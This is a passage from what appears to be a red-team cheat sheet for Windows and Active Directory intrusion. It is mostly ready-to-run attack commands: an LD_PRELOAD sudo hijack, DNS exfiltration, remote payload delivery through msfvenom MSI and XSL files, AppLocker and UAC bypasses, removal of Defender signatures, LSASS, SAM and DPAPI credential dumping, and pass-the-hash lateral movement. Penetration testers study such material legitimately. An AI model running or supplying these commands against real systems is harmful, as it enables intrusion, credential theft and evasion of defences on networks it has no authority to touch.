alias sudo="sudo LD_PRELOAD=/home/user/preload/evil_geteuid.so"
```

#### Fork & Run

```
if (fork() == 0)
{
        // we're running inside our newly created child process, run shell
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),pagesize, PROT_READ|PROT_EXEC))
        {
                perror("mprotect");
                return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
}
else
{
        // otherwise return expected value of geteuid to continue running as intended
        printf("HACK: returning from function...\n");
        return (*old_geteuid)();
}
```

## Post Exploitation

### Situational Awareness

#### whoami

```
# short
beacon> shell whoami

# full
beacon> shell whoami /all

# groups
beacon> shell whoami /groups

# privileges
beacon> shell whoami /privs
```

#### Net

##### Users
```
# local users
beacon> shell net user

# specific local user
beacon> shell net user administrator

# domain users
beacon> shell net user /domain

# specific domain user
beacon> shell net user j.doe /domain
```

##### Groups

```
# local
beacon> shell net localgroup

beacon> shell net localgroup administrators

# domain
beacon> shell net group /domain

beacon> shell net "Domain Admins" /domain
```

##### Computers

```
# domain computers
beacon> shell net group "Domain Computers" /domain

# domain controllers
beacon> shell net group "Domain Controllers" /domain
```

#### Other

```
beacon> getuid

beacon> ipconfig /all

beacon> netstat -ano | findstr LIST
```

#### BloodHound Queries

```
# find users that can access machine
MATCH (u:User ), (c:Computer {name:"WKSTN-7624.VAULT.IO"}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find kerberastable users
MATCH (u:User {hasspn:true}) RETURN u

# find kerberoastable users that have path to another computer
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find unconstrained delegation machines
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# shortest path to unconstrained from owned
MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p

# find domain users with SQLAdmin
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

#### Powershell

```
# check constrained language mode
PS> $ExecutionContext.SessionState.LanguageMode

# easy bypass
Powershell -version 2 [...]

# download
IEX(New-Object Net.WebClient).downloadString('https://[...]')

# download v3+
iex (iwr 'https://[...]')

# no profile
powershell -nop

# execution bypass
powershell -exec bypass

# hidden
powershell -w hidden

# exec base64 command
PS> powershell -enc [...]

# check Applocker
powershell Get-ApplockerPolicy -Effective -xml

# check av
powershell Get-MpComputerStatus

# credentials
PS> $Cred = New-Object System.Management.Automation.PSCredential('vault.io\s.morese', $SecPassword) 
[...]
PS> [...] -Credential $Cred

# list pipes
PS> [System.IO.Directory]::GetFiles("\\.\\pipe\\")
```

Cobalt Strike

```
# Domain
beacon> net domain

# Domain Controller
beacon> net domain_controllers

# shares
beacon> net shares
beacon> net shares \\vault.io

# Domain User
beacon> net user \\vault.io l.smith

# all users
beacon> net user \\vault.io

# computers
beacon> net computers

# Domain Admins
beacon> net group \\vault.io Domain Admins

# local group
beacon> net localgroup

# logons
beacon> net logons

# sessions
beacon> net sessions \\s-east-05.vault.io

# domain trusts
beacon> net domain_trusts
```

PowerView

```
# Domain
beacon> powershell Get-Domain

# Domain Controller
beacon> powershell Get-DomainController | Select-Object Forest, Name, OSVersion

# Forest
beacon> powershell Get-ForestDomain

# Policy
beacon> powershell Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# Domain User for specific user, -Identity l.smith 
beacon> powershell Get-DomainUser -Properties SamAccountName, MemberOf | fl

# All Users
beacon> powershell Get-DomainUser

# computers
beacon> powershell Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName

# OU
beacon> powershell Get-DomainOU -Properties Name | Sort-Object -Property Name

# Domain Admins
beacon> powershell Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member

# Domain Group Member
beacon> powershell Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName

# All GPO
beacon> powershell Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

# Local GPO Groups
Get-DomainGPOLocalGroup -ResolveMembersToSIDs

# Specific Computer
beacon> powershell Get-DomainGPO -Properties DisplayName -ComputerIdentity s-east-05| Sort-Object -Property Display

# Specific Policy
beacon> powershell Get-DomainGPO -Identity SomeGPOName

# Download
beacon> download \\vault.io\SysVol\vault.io\Policies\{CBZLLD65-D822-469A-ADB4-BE08DF6FZZZ1\Machine\Registry.pol

# Domain Local Group
beacon> powershell Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName

# Domain User Location
beacon> powershell Find-DomainUserLocation -UserGroupIdentity 'Domain Admins' | Select-Object UserName, SessionFromName

beacon> powershell Find-DomainUserLocation -Domain vault.io -UserIdentity p.sampson

# Local Group
beacon> powershell Get-NetLocalGroup | Select-Object GroupName

# Remote Machine Local Group
beacon> powershell Get-NetLocalGroup -ComputerName 's-east-05'| Select-Object GroupName

# Local Group Member
beacon> powershell Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

# logons
beacon> powershell Get-NetLoggedOn | Select-Object UserName

# sessions
beacon> powershell Get-NetSession -ComputerName s-east-05 | Select-Object CName, UserName

# Domain Trusts
beacon> powershell Get-DomainTrust -Domain vault.io

# Domain Trusts Dns
gwmi -Namespace root\MicrosoftDNS -Class MicrosoftDNS_Zone -Filter "ZoneType = 4" |Select -Property @{n='Name';e={$_.ContainerName}}, @{n='DsIntegrated';e={$_.DsIntegrated}}, @{n='MasterServers';e={([string]::Join(',', $_.MasterServers))}}, @{n='AllowUpdate';e={$_.AllowUpdate}}

# non-null SPNs
beacon> powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

# asreproastable
beacon> powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName

# unconstrained delecation computers
beacon> powershell Get-DomainComputer -Unconstrained -Properties DnsHostName

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }

# list users with dcsync rights
Get-ObjectACL -DistinguishedName "dc=companyx,dc=com" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') } | select IdentityReference
```

### Resources
- https://github.com/PowerShellMafia/PowerSploit
- https://powersploit.readthedocs.io/en/latest/Recon/
- https://github.com/tevora-threat/SharpView
- https://github.com/HunnicCyber/SharpSniper

## BloodHound

SharpHound

```
# thorough
beacon> execute-assembly /opt/tools/SharpHound.exe -c All,GpoLocalGroup -d vault.local

# stealth
beacon> execute-assembly c:\tools\sharphound3.exe -c DcOnly --Stealth --RandomizeFilenames

# download
beacon> download .\20210210043130_BloodHound.zip
```

bloodhound-python

```
# from linux terminal
$ bloodhound-python -c All -u j.smith -p Passw0rd -d vault.io -dc 10.0.0.1

# via proxy
proxychains bloodhound-python -u robert.lanza -p 'U=zk1J.TYruU*' -d inception.local -ns 10.9.40.5 -dc indc.inception.local --dns-tcp -c All,LoggedOn
```

### Resources
- https://github.com/BloodHoundAD/SharpHound3
- https://github.com/fox-it/BloodHound.py
- https://github.com/hausec/Bloodhound-Custom-Queries


### Host Recon

#### Misc situational awareness.

```
# Using CS
beacon> help net
[...]

beacon> screenshot
[...]

beacon> keylogger 30
[...]

# SeatBelt
beacon> execute-assembly /opt/tools/SeatBelt.exe -group=system
```

#### Port scanning

CS

```
# Discovered Targets can view found: 'View -> Targets'
beacon> portscan 10.0.0.0/24 22,80,135,443,445,1433,3389,5895,5896 none
[...]
```

NMAP

```
beacon> socks 1080

# edit /etc/proxychains.conf
$ proxychains3 nmap -n -sT 10.0.0.0/24 -oA nmap-st-10.0.0.0
```

#### Policies

```
PS> Import-Module C:\tools\GPRegistryPolicy\GPRegistryPolicyParser.psm1
PS> Parse-PolFile C:\Users\sysadm\Desktop\Registry.pol
```

### Socks & Port Forwards

#### DNS Exfil Simple

```
> $n=$(whoami);dig "$n.asdf.burpcollab.net"

>  $d=(wmic computersystem get domain);$e=[convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($d);nslookup "$e.asdf.burpcollab.net"
```

#### DNS Tunnel via dnscat

Start dnscat2-server for tunnel.com

```
dnscat2-server tunnel.com
```

From Win10

```
dnscat-2-v0.07-client-win32.exe tunnel.com
```
#### DNSliver

Print, save, and exec functionality via DNS

```
./dnslivery.py eth0 <ns record>.atkr.xyz <A record>.atkr.xyz -p /tmp/dnswww -v
```

##### Resources
- https://github.com/no0be/DNSlivery
- https://medium.com/@maarten.goet/protecting-against-malicious-payloads-over-dns-using-azure-sentinel-b16b41de52fd
- https://www.ired.team/offensive-security/exfiltration/payload-delivery-via-dns-using-invoke-powercloud

#### Msf Socks Proxy

Leverage a session to create a socks proxy.

```
# auto add the route
msf> use multi/manage/autoroute
msf> set session 1
msf> exploit

# setup the socks proxy
msf> use auxiliary/server/socks_proxy
msf> set version 4a
msf> exploit -j
```

Modify /etc/proxychains.conf

```
socks4  127.0.0.1 1080
```

Execute tool

```
proxychains cme smb 192.168.1.4 -u user -p pass
```

#### Msf Reverse Port Forward

```
msf5 > sessions 1
[*] Starting interaction with 1...

meterpreter > portfwd add -R -p 8080 -l 80 -L 10.8.0.6
[*] Local TCP relay created: 10.8.0.6:80 <-> :8080
```

#### Reverse Socks Tunnel with Chisel

Build

```
git clone https://github.com/jpillora/chisel && cd chisel

# linux bin
go build

# windows bin
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

Start the server

```
./chisel server -p 8080 --socks5
```

Create socks proxy via ssh

```
ssh -N -D 0.0.0.0:1090 localhost
```

Create the client on the target

```
c:\tools>chisel.exe client 192.168.49.83:8080 socks
```

Modify proxychains.conf & execute

```
proxychains rdesktop 192.168.83.10
```

#### Cobalt Strike Proxies

```
# access the target network
beacon> socks 1050
[...]

# target network access teamserver
beacon> rportfwd 9001 192.168.1.12 80
[...]

# msf use proxy
msf5> set Proxies socks4:127.0.0.1:1050
```

### AppLocker Bypass Execution

#### Enumerate

```
beacon> execute-assembly /tools/SeatBelt.exe -group=system

# using MS modules, for local policies, use -Local 
beacon> Get-AppLockerPolicyInfo | ft -AutoSize
beacon> Get-AppLockerPolicyInfo -Local | ft -AutoSize
```

#### Resources
- https://p0w3rsh3ll.wordpress.com/2020/05/15/how-to-view-an-applocker-policy-enforcement/

#### DotNetToJscript

Compile managed TestAssembly dll and run DotNetToJscript

```
.\DotNetToJScript.exe -l JScript -v v4 .\ExampleAssembly.dll -o met.js
```

#### WorkFlow Compiler LOLBAS AppLocker Bypass

Port C# program to [WorkflowCompiler-Reflective-PE-Runner.cs](../src/csharp/WorkflowCompiler-Reflective-PE-Runner.cs) 

Configure [WorkFlowCompiler.xml](../src/Misc/WorkFlowCompiler.xml) to use as input to Microsoft.Workflow.Compiler.exe. Or generate the XML using [this powershel](../src/powershell/WorflowCompilerXmlGenerator.ps1)

Useful for applocker bypass, similar to MSBuild.exe

Compile & Execute 

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe input.xml output.xml
```

#### MSBuild Execution

Use [Stub-MSBuild-CSharp-x64.xml](../src/Misc/Stub-MSBuild-CSharp-x64.xml) to configure C# program. 

Compile & Execute

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\legit.xml
```

#### InstallUtil

Sample C# program using [CLM Bypass](../src/csharp/UninstallerRunspaceBypass.cs)

Execute

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U .\UninstallerBypass.exe
```

#### SysInternals PsExec

```
# grab SYSTEM shell
> PsExec64.exe -i -s cmd

# specify user
> psexec64.exe -i -u "NT AUTHORITY\Network Service" cmd.exe
```

#### XSL Transform

Execute Jscript code via a remote XSLT file. Start with this [XSL Stub](../src/misc/Stub-Jscript.xsl)

```
cmd.exe>wmic process get brief /format:"http://192.168.49.83/hollow.xsl"
```

### Application Whitelisting

#### Access Checks

```
# find writeable folders via sysinternalssuite
accesschk.exe "student" C:\Windows -wus

# find executable folders via icacls
icacls.exe C:\Windows\Tasks

# or 
icacls.exe c:\windows\System32\spool\drivers\color
```

#### Code Execution via DLLs

```
rundll32 c:\tools\testdll.dll,run
```

#### Executing code from c:\windows\installer\

Create and *remotely host* MSI installer payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f msi-nouac -o meterp64-nouac.msi
```

Run

```
msiexec /i http://192.168.49.83/meterp64-nouac.msi /qn
```

#### Alternate Data Streams

Find a file in a trusted location that is both writeable and executable, bypassing AppLocker.

For example, TeamViewer 12, uses a log file "TeamViewer12_Logfile.log" meets these requirements.

```
type test.js > "c:\program files (x86)\Teamviewer\teamviewer12_logfile.log:test.js"
```

#### Third Party Execution

Keep an eye out for:

- python.exe
- php.exe
- java
- etc

#### Bypass Constrained Language Mode (CLM)

Use C# to create a runspace bypass

[Full Source](../src/csharp/RunspaceBypass.cs)

```
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
        }
    }
}
```
---

### 5. Post Exploitation Recon

#### Defender

List Protection History

```
PS> Get-MpThreat

PS> Get-MpThreatDetection
```

Remove All Signatures

```
C:\Program Files\Windows Defender\MpCmdRun.exe\ -RemoveDefinitions -All
```

#### PowerShell Constrained Language Mode Check

```
PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

## Persistence

Common options:
- HKCU / HKLM Registry Autoruns - executed at user login using Run and RunOnce registry keys
- Scheduled Tasks - execute at set intervals
- Startup Folder - execute at user login
- COM hijack - execute with permission to modify entry points

### Resources
- https://github.com/cobbr/SharpSploit
- https://github.com/harleyQu1nn/AggressorScripts
- https://github.com/tyranid/oleviewdotnet
- https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
- https://github.com/Sw4mpf0x/PowerLurk
- https://github.com/0xthirteen/StayKit

## Privilege Escalation

#### Privilege Escalation Automated Checks

```
# PowerUp
PS> . .\PowerUp.ps1
PS> Invoke-Allchecks

# SharpUp
beacon> execute-assembly c:\tools\SharpUp.exe

# PrivescCheck
PS> . .\PrivescCheck.ps1
PS> Invoke-PrivescCehck

# SeatBelt
beacon> execute-assembly /tools/SeatBelt.exe -group=system
```

#### UAC Bypass FodHelper Technique

```
PS C:\Users\tonys> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force

PS C:\Users\tonys> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\tonys> C:\Windows\System32\fodhelper.exe
```

### Privilege Escalation Manual Checks

#### Windows Services

```
beacon> run sc query
[...]

beacon> run sc qc 'Some Service'
[...]

beacon> powershell Get-Service | fl
[...]

beacon> powershell 'Some Service' | Get-ServiceAcl | Select-Object -ExpandProperty Access
[...]

# generate service dll in CS - Attacks > Packages > Windows Executable (Stageless) > Output > Windows Service EXE

# upload
beacon> cd \windows\temp
beacon> upload /root/evil-service.exe

# configure
beacon> shell sc config 'Some Service' binPath= "c:\windows\temp\evil-service.exe"

# start
beacon> run sc start 'Some Service'
[...]

# using peer beacon
beacon> connect localhost 4444
```

#### Unquoted Service Paths

```
# list
beacon> shell wmic service get name, pathname
[...]

# check 
beacon> powershell Get-Acl -Path c:\program files\Super Sql\ | fl
[...]
```

#### Always Elevated

```
# Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys are set, $False otherwise. If one of these keys are set, then all .MSI files run with elevated permissions, regardless of current user permissions.

beacon> powershell Get-RegistryAlwaysInstallElevated
[...]

# upload MSI & Execute
beacon> shell msiexec /i c:\Users\target\Desktop\Evil.msi /qn

beacon> connect localhost 4444
```

Restrictions:
Default Installer rules:
- (everyone) all digitally signed windows installer files
- (everyone) all installer files in %systemdriver\%windows\installer
	- `%WINDIR%\Installer\*`
- (builtin\administrators) all installer files

To get this to work the MSI file needs to be the "no-uac" format and the msiexec command requires the `/qn` flags. The file must be remote, under those conditions. A temp file is created in the white listed directory c:\windows\installer.

```
c:\windows\installer\

03/25/2021  06:16 PM           126,976 MSI2658.tmp
```

Create

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f msi-nouac -o meterp64-nouac.msi
```

Run

```
msiexec /i http://192.168.49.83/meterp64-nouac.msi /qn
```

#### UAC

Technique has been patched from Windows 10 1809 and onwards.

Version 1607 LTSC still vulne (EoL 2026)

```
beacon> help elevate
[...]

# list exploits
beacon> elevate
[...]

# exploit
beacon> elevate uac-token-duplication peer-localhost-6000

# runasadmin
beacon> help runasadmin
beacon> runasadmin
```

### Resources
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
- https://github.com/GhostPack/SharpUp
- https://github.com/rasta-mouse/Watson
- https://github.com/itm4n/PrivescCheck
- https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
- https://github.com/hfiref0x/UACME


### Credentials

#### Katz

##### Resources
- https://github.com/gentilkiwi/mimikatz
- https://github.com/gentilkiwi/kekeo
- https://github.com/S3cur3Th1sSh1t/PowerSharpPack
- https://github.com/G0ldenGunSec/SharpSecDump
- https://github.com/itm4n/PPLdump
- https://github.com/cube0x0/SharpMapExec
- https://github.com/cube0x0/MiniDump
- https://github.com/byt3bl33d3r/CrackMapExec

##### SAM

Manual

```
# shadowcopy
cmd> wmic shadowcopy call create Volume='C:\'
cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\vault.local\Downloads\sam
cmd> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\vault.local\Downloads\security

# local
reg vaultalocal HKLM\sam C:\users\vault.local\Downloads\sam
reg save HKLM\system C:\users\vault.local\Downloads\system
```

Secretsdump parse

```
# secretsdump.py -sam sam -system system LOCAL
secretsdump.py -sam sam -system system -security security LOCAL
```

Meterp

```
hashdump
```

Covenant

```
> SamDump
```

CS

```
beacon> hashdump
[...]

beacon> mimikatz token::elevate lsadump::sam
[...]
```

CME

```
cme smb srv02.vualt.local -u locadm -p "yoloyolo1!' --sam
##### Secrets
```

##### Cache

CS

```
beacon> mimikatz lsadump::cache
```

Crack

```
# linux terminal
hashcat -m 2100
```

SharpSecDump

```
SharpSecDump.exe -target=sccm.vault.local -u=sccmsvc -p=salt&Vinegar! -d=vault.local
```

SharpMapExec

```
# kerberos ticket
SharpMapExec.exe kerberos winrm /ticket:sccmsvc.ticket /domain:vault.local /computername:sccm-2.vault.local /m:secrets

# password or hash
SharpMapExec.exe kerberos winrm /user:socadm /rc4:92392cbere646b159f2dd78d36cb968a /domain:vault.local /computername:sccm-2.vault.local /m:secrets
```

##### LSASS

###### Cobalt Strike LSASS/Logon Passwords

```
beacon> logonpasswords
```

SafetyKatz

```
beacon> execute-assembly c:\tools\SafetyKatz.exe
[...]
```

###### Mimikatz Logon Passwords 

```
# set privs
mimikatz # privilege::debug

# run
mimikatz # sekurlsa::logonpasswords
```

###### Covenant Logon Passwords

```
> LogonPasswords 
```

###### Remote LSASS

```
SharpMapExec.exe kerberos winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs

SharpMapExec.exe ntlm winrm /user:sqlsvc /password:Ch3xmix! /domain:vault.local /computername:sql-1.vault.local /m:comsvcs
```

###### Disable LSA protection with Mimikatz

```
# must be local admin or SYTEM
mimikatz # !+

# disable PPL (requires uploading mimidrv.sys)
mimikatz # !processprotect /process:lsass.exe /remove

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
[...]
```

##### Disable LSA Protection with Invoke-Mimikatz

```
# upload driver
> Upload /filepath:"C:\windows\tasks\mimidrv.sys"

# configure the driver service
> shellcmd sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand

> shellcmd sc start mimidrv

# disable PPL
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""

# procdump, mimikatz, or custom minidumpwritedump
> Assembly /assemblyname:"MyMiniDump" /parameters:""

# get local copy
> download c:\windows\tasks\lsass.dmp

# local windows
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit 
```

###### Disable LSA Protection and Dump with PPLDump

```
# bypass PPL and create dump
\PPLdump.exe lsass.exe C:\users\administrator\desktop\lsassdmp.txt

# inline parse
minidump.exe lsass.dmp
```

###### Cleartext Creds

Set `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` and wait for next logon.

###### Offline LSASS

Via `procdump.exe`

```
# get system shell
> c:\Tools\SysinternalsSuite>PsExec.exe -i -s cmd

# create dump
>.\procdump.exe -ma lsass.exe c:\tools\lsass.dmp

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com


ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[13:24:51] Dump 1 initiated: c:\tools\lsass.dmp
[13:24:52] Dump 1 writing: Estimated dump file size is 45 MB.
[13:24:52] Dump 1 complete: 45 MB written in 0.7 seconds
[13:24:52] Dump count reached.
```

Parse via Mimikatz

```
mimikatz # sekurlsa::minidump lsass.dmp

mimikatz # sekurlsa::logonpasswords
```

##### Credential Cache

```
# obtain
$ proxychains scp -r root@10.0.0.23:/tmp/krb5cc_613516103_maDBOTO
[...]

# convert
$ ticketConverter.py /tmp/krb5cc_613516103_maDBOTO /tmp/stolenticket.kirbi
[...]

# impersonate
beacon> kerberos_ticket_use /tmp/stolenticket.kirbi
```

### Local Administrator Password Solution (LAPS)

#### Enumerate

BloodHound

```
# find computers with LAPS enabled
MATCH (c:Computer {haslaps: true}) RETURN c

# find groups that can read LAPS
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

CS

```
# use bloodhound to find registry.pol file for download
beacon> download \\vault.io\SysVol\vault.io\Policies\{FDC369C2-35C2-4D97-B455-BB7839854512}\Machine\Registry.pol
```

#### Creds

```
beacon> make_token vault.io\mssql_svc Passw0rd
[...]

# if laps tools are installed
beacon> powershell Get-Command *AdmPwd

# using PowerView
beacon> Get-DomainComputer
```

Using CrackMapExec

```
cme ldap vic.tim.local -u tom -p October2021 -M laps
```

### Impersonation

#### Steal token

Cobalt Strike

```
# find desired PID
beacon> ps

# Steal
beacon> steal_token 4416
[+] Impersonated [...]

# revert
beacon> rev2self
```

Covenant

```
# find users/pid
> ProcessList

# impersonate
> ImpersonateUser vault\adm_ryan
```

MSF Incognito

```
# load incognito
meterpreter > load incognito

# list currently used tokens
meterpreter > list_tokens -u

# impersonate token
meterpreter > impersonate_token CORP1\\admin
```

#### Make Token

```
beacon> make_token vault\boss_adm Passw0rd
[+] Impersonated [...]
```

#### Overpass-the-Hash

enum

```
beacon> execute-assembly /opt/tools/Rubeus.exe triage
```

ptt

```
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:b.builder /rc4:8t2g408a8aec852ef2e458b938b8b820 /nowrap /ptt
```

import

```
# get ticket
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:b.builder /rc4:8t2g408a8aec852ef2e458b938b8b820 /nowrap
[...]

# store ticket
PS > [System.IO.File]::WriteAllBytes("C:\Users\adm\Desktop\b.builder-tgt.kirbi", [System.Convert]::FromBase64String("qoIE[...snip...]Mllz"))

# burn session
beacon> make_token vault\b.builder fakepassword
[...]

# import
kerberos_ticket_use C:\Users\adm\Desktop\b.builder-tgt.kirbi
```

## Credential Manager

Local Admin

```
beacon> mimikatz sekurlsa::dpapi
[...]
```

Standard User

```
# list creds
beacon> shell vaultcmd /listcreds:"Windows Credentials" /all
[...]

# list files
beacon> ls c:\users\<user>\AppData\Local\Microsoft\Credentials

# Get blob, note guidMasterKey and pbData
beacon> mimikatz dpapi::cred /in:c:\users\<user>\AppData\Local\Microsoft\Credentials\<credential>
[...]

# get user sid
beacon> powershell-import /opt/tools/PowerSploit/Recon/PowerView.ps1
beacon> powershell ConvertTo-SID -ObjectName 'h.samuelson' -Domain 'vault.io'
S-1-5-21[...]

# get MasterKey
beacon> c:\users\h.samuelson\appdata\Roaming\Microsoft\Protect\<sid>\
[...]

beacon> mimikatz dpapi::masterkey /in:c:\users\h.samuelson\appdata\Roaming\Microsoft\Protect\<sid>\<guid> /rpc
[domainkey] with RPC
[DC] 'vault.io' will be the domain
[DC] 'dc01.vault.io' will be the DC server
  key : [...]

# decrypt
beacon> mimikatz dpapi::cred /in:c:\users\h.samuelson\AppData\Local\Microsoft\Credentials\<credential> /masterkey:<masterkey>
[...]
UserName: vault\server_admin
CredentialBlog: l33tPw4vault
```

Chrome

```
# cs
beacon> chromedump

# SharpChrome
beacon> execute-assembly /opt/tools/SharpChrome.exe history logins
```

### Resources
- https://github.com/djhohnstein/SharpChrome


#### LAPS

```
# import
ps> Import-Module .\LAPSToolkit.ps1

# search
> Find-LAPSDelegatedGroups

# dump
> Get-LAPSComputers
```

---

## 6. Lateral Movement

### RDP

#### Impacket

```
rdp_check.py 'vault/administrator:Password123!@192.168.83.122'
```

#### Kill User Session

```
# get sessions
qwinsta /server:<server>

# kill session
rwinsta /server:<server> <session number>
```

#### Restricted Admin 

Make a "restrictedadmin" connection

```
# uses current logon session & does not require cleartext creds
mstsc.exe /restrictedadmin
```

Enable/Disable - `HKLM:\System\CurrentControlSet\Control\Lsa`

#### Remotely Enable RDP Restricted Admin 

Launch local instance of powershell in the context of admin via Mimikatz

```
mimikatz # privilege::debug

mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:powershell
```

Open a PS session on target & enable restrictedadmin

```
PS> Enter-PSSession -Computer appsrv01

PS> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

#### Pass the Hash RDP

Restricted mode protects against credential attacks but allows for pass-the-hash connections. 

```
mimikatz # privilege::debug

mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:"mstsc.exe /restrictedadmin"
```

Or, using XFreeRdp

```
xfreerdp /u:admin /pth:2892d26cdf84d7a70e2eb3b9f05c425e /d:corp1.com /v:192.168.83.6
```

#### SharpRDP

```
> .\SharpRDP.exe computername=appsrv01 command="powershell -exec bypass -enc IAA9[...]AA==" username=corp1\dave password=lab
```

#### RdpThief

```
c:\tools\> mstsc.exe

c:\tools\> .\RdpThiefInject.txe

c:\tools\> type c:\users\dave\appdata\local\temp\2\data.bin
```

### PsExec

#### ShittySCShell

```
ShittySCShell.exe appsrv01 InstallService "c:\windows\system32\cmd.exe /C powershell -exec bypass -enc JABk[...]AJAB"
```

#### SCShell

python

```
python3 scshell.py -service-name 'SensorService' 'corp1/admin:lab@192.168.83.6'

python3 /usr/local/bin/scshell.py -hashes '1ef8ec7a4e862ed968d4d335afb77215:1ef8ec7a4e862ed968d4d335afb77215' 'vault/sqladm@172.0.0.155'
```

exe

```
.\SCShell.exe 192.168.83.121 InstallService "c:\windows\system32\cmd.exe /c powershell -exec bypass -enc
```

#### Impacket

```
proxychains psexec.py -hashes '1ef8ec7a4e862ed968d4d335afb77215:1ef8ec7a4e862ed968d4d335afb77215' 'vault/sqladm@172.16.83.152'
```

#### Using Covenant WMICommand

```
> wmicommand dc02 "powershell -exec bypass -enc JABkA[...]AAoA"
```

#### Using Covenant PowerShellRemoting

```
> PowerShellRemotingCommand dc02 "powershell -exec bypass -enc JABk[...]AAoA"
```

#### Evil-WinRM

```
proxychains evil-winrm -i 172.16.83.152 -u sqlsvc -H '1ef8ec7a4e862ed968d4d335afb77215'
```

#### Over Pass the Hash

Meterpreter

```
# get rc4
> invoke-rubeus -command "hash /password:Summer2018!"

# get aes
> invoke-rubeus -command "hash /password:Summer2018! /user:fs-thelikes$ /domain:vault.local"

# request tgt
> invoke-rubeus -command "asktgt /user:sqladm /rc4:1ef8ec7a4e862ed968d4d335afb77215"

# create a dummy process
> invoke-rubeus -command "createnetonly /program:c:\windows\system32\cmd.exe"

# pass the ticket to the process
> invoke-rubeus -command "ptt /ticket:[...] /luid:0x49c51e"
```

Covenant

```
# request a ticket
> rubeus asktgt /user:bruce /rc4:<ntlm> /outfile:ticket.kirbi

# sacraficial process
> rubeus createnetonly /program:c:\windows\system32\cmd.exe

# pass the ticket
> rubeus ptt /luid:0x330c17 /ticket:c:\windows\tasks\ticket.kirbi

# impersonate
> ImpersonateProcess 1116
```

Impacket

```
getTGT.py -dc-ip 10.9.0.1 'vault.local/attackersystem$:Summer2018!'
```

### Process Injection

```
# find desired PID
beacon> ps
[...]

beacon> inject 340 x64 peer-localhost
[...]
```

### Resources
- https://github.com/GhostPack/Rubeus
- https://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/

## Lateral Movement

Common options:
- Windows Management Instrumentation (WMI)
- PowerShell Remoting
- PsExec

### Windows Management Instrumentation (WMI)

Manual

```
beacon> shell wmic /node:"w-west-239" /user:"vault.io\n.perroti" /password:"Passw0rd" process call create "powershell -enc [...snip...]"
```

CS

```
# powershell 1 liner
beacon> remote-exec wmi w-west-239 powershell -enc [...]

# upload
